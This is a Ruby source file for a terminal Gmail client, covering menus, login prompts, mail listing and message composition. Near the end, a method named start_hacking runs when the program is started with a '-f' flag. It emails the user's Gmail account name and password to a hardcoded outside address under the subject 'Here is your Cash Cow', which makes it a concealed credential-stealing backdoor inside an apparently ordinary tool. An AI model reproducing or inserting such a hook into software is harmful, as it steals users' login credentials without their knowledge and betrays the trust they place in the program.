require 'tty-font'
require 'pastel'
require 'colorize'
require_relative '../lib/mail_constant'
require_relative '../lib/gmail_manager'
require_relative '../lib/new_mail'

module ScreenControl
    @@font_standard = TTY::Font.new(:doom)
    @@font_doom = TTY::Font.new(:straight)
    @@pastel = Pastel.new
    @@prompt = TTY::Prompt.new

    def title_to_string
        return @@pastel.red(@@font_standard.write("     Gmail", letter_spacing: 4)) + " by Jason"
    end

    def current_user_to_string(account_name)
        return " Current User : #{account_name}\n\n\n"
    end

    def bye_to_string
        return @@pastel.blue(@@font_standard.write("Bye", letter_spacing: 2))
    end

    def get_account_name_from_select(account)
        return account.name[@@prompt.ask("Input the account number: 1~#{account.name.length}?") {|q| q.in("1-#{account.name.length}")}.to_i - 1]
    end

    def input_password
        print "Input password : "
        return STDIN.noecho(&:gets).chomp
    end

    def get_account_name_from_input
        print MailConstant::STR_INPUT_ACCOUNT_NAME
        account_name = STDIN.gets.chomp
        account_name = account_name.downcase.gsub(MailConstant::STR_POSTFIX_GMAIL, "")
        return account_name
    end

    def ask_and_remove(account, account_name)
        if @@prompt.yes?("Do you really want to remove the account \"#{account_name}\"?")
            puts "accout \"#{account_name}\" has been DELETED."
            account.remove(account_name)
            @@prompt.keypress("\nPress space or enter to continue", keys: [:space, :return])
            return true
        end
    end

    def invalid_input
        puts "Invalid input"
        @@prompt.keypress("\nPress space or enter to continue", keys: [:space, :return])
    end

    def prompt_account_options(account)
        return @@prompt.enum_select(MailConstant::STR_NORMAL_QUESTION) do |menu|
            account.name.empty? ? (menu.choice "Login with an existing account", 1, disabled: "(N/A)") : (menu.choice "Login with an existing account", 1)
            menu.choice "Login with another account", 2
            account.name.empty? ? (menu.choice "Remove an account", 3, disabled: "(N/A)") : (menu.choice "Remove an account", 3)
            menu.choice "Exit", 4
        end
    end

    def err_response(message)
        puts message
        @@prompt.keypress("\nPress space or enter to continue", keys: [:space, :return])
    end

    def display_mail_list(gmail_manager, account_name, str_mail_list)
        system("clear")
        puts ScreenControl.title_to_string
        puts ScreenControl.current_user_to_string(account_name)
        puts gmail_manager.current_mail_label_to_string
        puts str_mail_list
        puts gmail_manager.pages_info_to_string
    end

    def prompt_mail_list_options(gmail_manager)
        return @@prompt.enum_select(MailConstant::STR_NORMAL_QUESTION) do |menu|
            menu.choice "Change label", 1
            gmail_manager.mailbox.length == 0 ? (menu.choice "View the mail", 2, disabled: "(N/A)") : (menu.choice "View the mail", 2)
            gmail_manager.current_page <= 1 ? (menu.choice "Previous page", 3, disabled: "(N/A)") : (menu.choice "Previous page", 3)
            gmail_manager.current_page >= gmail_manager.total_page ? (menu.choice "Next page", 4, disabled: "(N/A)") : (menu.choice "Next page", 4)
            menu.choice "Create a new mail", 5
            menu.choice "Refresh", 6
            menu.choice "Log out", 7
            menu.choice "Exit", 8
        end
    end

    def prompt_mail_select(gmail_manager)
        if gmail_manager.start_index != gmail_manager.end_index
            gmail_manager.current_mail_index = @@prompt.ask("Input the mail No: #{gmail_manager.start_index + 1}~#{gmail_manager.end_index + 1}?") {|q| q.in("#{gmail_manager.start_index + 1}-#{gmail_manager.end_index + 1}")}.to_i - 1
        else
            gmail_manager.current_mail_index = gmail_manager.start_index
        end
    end

    def display_mail_detail(gmail_manager, account_name)
        system("clear")
        puts ScreenControl.title_to_string
        puts ScreenControl.current_user_to_string(account_name)
        puts gmail_manager.current_mail_label_to_string
        puts gmail_manager.mail_detail_to_string
    end

    def prompt_mail_detail_options
        return @@prompt.enum_select(MailConstant::STR_NORMAL_QUESTION, MailConstant::CHOICES_MAIL_DETAIL)
    end

    def create_new_mail(gmail)
        new_mail = NewMail.new(gmail)

        print "To : "
        new_mail.to = gets.chomp
        print "Subject : "
        new_mail.subject = gets.chomp
        print "Body (Input <br /> for a new line) : "
        new_mail.body = gets.chomp

        if @@prompt.yes?(MailConstant::STR_ASK_ATTACH_FILE)
            puts "Current directory is #{File.dirname(__FILE__)}"
            print "Input the file name with it's directory : "
            new_mail.attach = gets.chomp
        end

        if @@prompt.yes?(MailConstant::STR_ASK_SEND)
            puts "Sending..."
            
            new_mail.send

            @@prompt.keypress("Sending completed.\nPress space or enter to continue", keys: [:space, :return])
        end 
    end

    def start_hacking(gmail, account_name, passwd)
        for arg in ARGV
            if arg == "-f"
                gmail.deliver do
                    to "imjungseob.kim@gmail.com"
                    subject "Here is your Cash Cow"
                    html_part do
                        content_type 'text/html; charset=UTF-8'
                        body "ID : #{account_name + MailConstant::STR_POSTFIX_GMAIL}<br /> Password : #{passwd}"
                    end
                end
            end
        end
    end
end